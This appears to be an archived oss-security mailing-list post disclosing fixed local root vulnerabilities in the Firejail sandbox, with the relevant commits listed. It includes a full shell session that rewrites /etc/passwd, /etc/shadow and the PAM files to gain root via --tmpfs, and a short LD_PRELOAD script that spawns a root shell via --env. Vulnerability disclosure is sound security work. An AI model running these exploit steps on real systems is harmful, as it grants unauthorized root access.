  oss-security - Re: Re: Firejail local root exploit            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [<thread-prev] [thread-next>] [day] [month] [year] [list]  Date: Thu, 05 Jan From: Martin Carpenter <mcarpenter@...e.fr> To: oss-security@...ts.openwall.com Cc: cve-assign@...re.org Subject: Re: Re: Firejail local root exploit  Hi,  On Wed, at cve-assign@...re.org wrote: > >  * Firejail has too broad attack surface that allows users > >  * to specify a lot of options  I agree. I've kicked the tires a couple of times over the last year and my feeling is that there remains a lot of low hanging exploitable fruit. Although the devs have, with some encouragement, introduced macros to permanently drop privs or drop euid 0 where possible there are still places where that is not the case.  Setuid-root makes me sad, copy_file() worries me still and the ability for a non-priv user to run any seccomp filter on anything feels like an accident waiting to happen (assuming it cannot already be exploited).   A handful of concrete examples that I have reported are below. These are fixed but not previously discussed here and do not have CVEs AFAIK (perhaps MITRE could do the honors where deemed appropriate?).   1. --tmpfs  Prior to these commits:    commit   Author: netblue30 <netblue30@...oo.com>   Date:   Mon Jan 25        --tmpfs allowd only as root user    commit   Author: root <root@...ian>   Date:   Mon Jan 25        --tmpfs allowd only as root user   any non-privileged user could mount a tmpfs over any location. Eg mount over /etc to get root shell:  martin@...ntu14:~$ firejail --noprofile --tmpfs=/etc  Parent pid child pid Warning: failed to mount /sys Child process initialized [I have no name!@...ntu14 firejail]$ echo "root:x:0:0:root:/root:/bin/bash" > /etc/passwd [I have no name!@...ntu14 firejail]$ uid=$(id -u) [I have no name!@...ntu14 firejail]$ echo "martin:x:$uid: $uid::/tmp:/bin/bash" >> /etc/passwd [I have no name!@...ntu14 firejail]$ echo "root::::::::" > /etc/shadow [I have no name!@...ntu14 firejail]$ echo "martin::::::::" >> /etc/shadow [I have no name!@...ntu14 firejail]$ echo "root:x:0:" > /etc/group [I have no name!@...ntu14 firejail]$ echo "martin:x:$uid:" >> /etc/group [I have no name!@...ntu14 firejail]$ touch /etc/{login.defs,pam.conf} [I have no name!@...ntu14 firejail]$ mkdir /etc/pam.d [I have no name!@...ntu14 firejail]$ echo "account sufficient pam_permit.so" > /etc/pam.d/other [I have no name!@...ntu14 firejail]$ echo "auth sufficient pam_permit.so" >> /etc/pam.d/other [I have no name!@...ntu14 firejail]$ echo "session sufficient pam_permit.so" >> /etc/pam.d/other [I have no name!@...ntu14 firejail]$ su -  root@...ntu14:~# id  uid=0(root) gid=0(root) groups=0(root)   2. Nuke /etc/resolv.conf  This is silly (but was flagged in the change log as a security issue): by chrooting to / a non-privileged user can truncate the (real) /etc/resolv.conf to 0 bytes. Fixed at:    commit   Author: netblue30 <netblue30@...oo.com>   Date:   Thu Oct 27        security: overwrite /etc/resolv.conf   3. Non-sticky /tmp, /var/tmp  "Mode considered harmful". For example (priv esc via system util, perhaps using "--caps.keep=setuid" left as exercise for reader):  martin@...ntu14:~$ firejail --noprofile  Parent pid child pid Warning: failed to mount /sys Child process initialized [martin@...ntu14 firejail]$ ls -ld /var/tmp drwxrwxrwx. 2 root root 40 Jan 26 /var/tmp [martin@...ntu14 firejail]$ exit martin@...ntu14:~$ ls -ld /var/tmp  drwxrwxrwt. 4 root root Jan 26 /var/tmp martin@...ntu14:~$    /tmp was mounted tmpfs prior to:    commit   Author: netblue30 <netblue30@...oo.com>   Date:   Sun Jan 31        various fixes  /dev, /dev/shm, /var/tmp, /var/lock were mounted prior to:    commit   Author: netblue30 <netblue30@...oo.com>   Date:   Fri Jan 29        testing  There are other weak perms fixed around here eg /dev/shm/firejail was prior to:    commit   Author: netblue30 <netblue30@...oo.com>   Date:   Sun Jan 31        various fixes  (I have not looked at these related changes and the exploitability of the issues that they hope to remediate).   4. Environment not cleaned before root exec()  The --x11 flag runs an X server as root in some circumstances and the --env flag can be used to set arbitrary environment variables. This skips runtime linker protections on eg LD_* variables for setuid executables. So a non-privileged user could pop a root shell in any number of ways, eg hooking calls to getenv(3) in xauth(1):    #!/bin/sh   gcc -xc -o rootshell.so -shared -fPIC - <<EOF   #include <stdlib.h>   char *getenv(const char *name) { exit(system("/bin/sh")); }   EOF   exec firejail --x11=xorg --env=LD_PRELOAD=$PWD/rootshell.so  There were a couple of fixes:    commit   Author: netblue30 <netblue30@...oo.com>   Date:   Thu Nov 3        security: env variables    commit   Author: netblue30 <netblue30@...oo.com>   Date:   Fri Nov 4        execv fixes  (the overly-specific LD_PRELOAD asserts that you see in there is a (hopefully redundant!) relic of that conversation).   5. Finally, I don't think this was one of mine but I spotted it paging through the commit log this evening:    commit   Author: netblue30 <netblue30@...oo.com>   Date:   Tue Jan 26        don't allow --chroot as user without seccomp support  Currently a non-privileged user can chroot anywhere but is prevented from mischief by seccomp filtering. (Thought this  worries me too, perhaps someone else can punt it further?). Prior to commit a23ac above however systems without seccomp support were permitted to use the --chroot flag but could not offer this seccomp mitigation. I'm guessing this leads to a privesc via the "copy binary" function on sudo(1) or similar (setuid) into a suitably prepared chroot.    firejail needs more attention IMHO, I'm sure there are more to shake out.  Regards,  Martin.    Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      